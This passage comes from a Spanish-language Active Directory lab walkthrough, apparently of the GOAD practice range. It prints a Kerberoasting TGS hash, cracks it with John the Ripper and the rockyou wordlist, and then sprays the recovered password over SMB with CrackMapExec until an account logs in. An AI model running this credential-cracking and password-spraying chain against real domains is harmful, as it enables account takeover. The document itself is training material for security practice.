       │ 1adc5293f2d52cd9d2162d00ca47b8eb858e97bec8687cbd479f5700e3aaaaf2b7d28cfbfbc1fb942dc1794648ea7d607118a12542357237ff512fe2f0fc59c5e853c2372672b1656f4e4d14d894d1d6fd9ab63b5bd2
       │ c373e0e8bcec31dbb0334a192e3c15c0ff4f58116ba7a3611e2b3ec22e4d13f6dc88d8c18c6959c00cb53e8bfa4d3420f28a6591d480f46b7282d36ed3979e71bb88774f822b8d28a3da9d3e7495c8911c300a29d7bb
       │ 1e5116f949c274ccd75e2be3fda101e6436a6c8bb25b53ec3143f3c8980633c401d3d4417dfb93e24b365a741e69d19201c1b895af1680933d8ca098bffc15726aa98cdb446c4c92ab390293eb0456db1a2ce55231c4
       │ 0f22c8c9e8347b0795d981298a0be14a1d4d5253673a87be839c91bba74e26eefe765ecf13720bea4c30a2b44eb07c875fa5c3010aa2dc68ff33458e925c9bc1590e47c26207244919c2fb5e7fd8ceb61bc0e660cef0
       │ 54eee2aa3309dee2e7d6f83ff907e18c64571286b4acd3e9819f662e9dec2bd59878e1d38c5dfc2178096e361be78cff903097025c94708306acc8504237d6944c13e16f1d0d8bfec5b4a641b97fa4d1f36544d16e95
       │ 35f7376c386cf164a7001c3f4ad34583d653e3d4524b2d0153a70f21f5eceef9588f2781179477cecb6b370f1ca5d95cc0e037d451ecde72bd62c84ff3687d76394f9b273ca45be9e9cfdc59423edb30488c336e241c
       │ 975562da60ba498c7d1469107e959e07e626888645ac06167c2b8a8978a47ea66db49e0603cbc6fde940abd50c21e58906e273ddf9dfacfc63438c7ecce48ef512bc4099b104d0c63af421e376cc9f1944a9056ff849
       │ 8e12500f2dff118b6552c
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

El siguiente paso implica intentar descifrarlo utilizando la herramienta "John the Ripper".

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #john --wordlist='/usr/share/wordlists/rockyou.txt' kerberoasting.hashes 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iknownothing     (?)
1g 0:00:00:14 DONE (2023-07-06 20:32) 0.06752g/s 968518p/s 1470Kc/s 1470KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Se puede confirmar que se han obtenido las credenciales de este usuario.

```jsx
┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cme smb 192.168.56.11 -u sql_svc -p 'iknownothing'
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:iknownothing STATUS_LOGON_FAILURE

┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2/10]
└──╼ #cme smb 192.168.56.11 -u jon.snow -p 'iknownothing'
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing
```

---